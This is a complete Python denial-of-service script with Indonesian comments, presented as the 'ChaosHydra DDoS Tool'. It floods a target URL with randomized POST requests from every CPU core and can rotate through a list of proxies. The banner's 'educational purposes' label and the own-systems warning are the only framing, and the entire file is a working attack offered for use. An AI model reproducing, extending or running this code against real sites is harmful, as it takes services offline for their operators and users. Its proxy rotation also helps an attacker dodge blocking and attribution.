import asyncio
import aiohttp
import random
import multiprocessing
import time
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║          ChaosHydra DDoS Tool        ║
    ║        For Educational Purposes       ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

# Daftar User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    # Tambahin lagi user agent disini
]

# Fungsi buat nyerang
async def attack_target(url, session, proxies):
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Upgrade-Insecure-Requests': '1',
            'Pragma': 'no-cache',
            'X-Custom-Header': ''.join(random.choices('abcdef0123456789', k=20))
        }

        payload_size = random.randint(512, 4096)
        data = {"data": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=payload_size))}

        if proxies:
            proxy = random.choice(proxies)
            try:
                async with session.post(url, headers=headers, data=data, proxy=proxy, timeout=5) as response:
                    print(f"Serangan ke {url} status: {response.status}")
            except Exception as e:
                print(f"Error proxy: {e}")
        else:
            async with session.post(url, headers=headers, data=data, timeout=5) as response:
                print(f"Serangan ke {url} status: {response.status}")
    except Exception as e:
        print(f"Error: {e}")

# Fungsi utama buat nge-DDOS
async def ddos_attack(url, num_requests, proxies):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        tasks = [attack_target(url, session, proxies) for _ in range(num_requests)]
        await asyncio.gather(*tasks)

# Fungsi buat jalanin di tiap core CPU
def run_attack(url, num_requests, proxies):
    asyncio.run(ddos_attack(url, num_requests, proxies))

async def main():
    clear_screen()
    print_banner()
    
    print("⚠️  PERINGATAN: Hanya untuk testing sistem sendiri!")
    print("=" * 50)

    target_url = input("Masukkan URL target: ")
    num_requests = int(input("Masukkan jumlah request per core: "))
    use_proxies = input("Gunakan proxy? (y/n): ").lower() == "y"
    proxies = []

    if use_proxies:
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✓ Loaded {len(proxies)} proxies from proxies.txt")
        except FileNotFoundError:
            print("✗ File proxies.txt tidak ditemukan. Tidak menggunakan proxy.")
            use_proxies = False
    
    print(f"\n🎯 Target: {target_url}")
    print(f"📨 Requests per core: {num_requests}")
    print(f"🔌 Proxy: {'Yes' if use_proxies else 'No'}")
    print("=" * 50)
    
    confirm = input("Lanjutkan? (y/n): ").lower()
    if confirm != 'y':
        print("Operasi dibatalkan")
        return

    num_processes = multiprocessing.cpu_count()
    print(f"Menjalankan serangan dengan {num_processes} core...")

    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=run_attack, args=(target_url, num_requests, proxies if use_proxies else []))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    print("Serangan selesai!")

if __name__ == "__main__":
    asyncio.run(main())
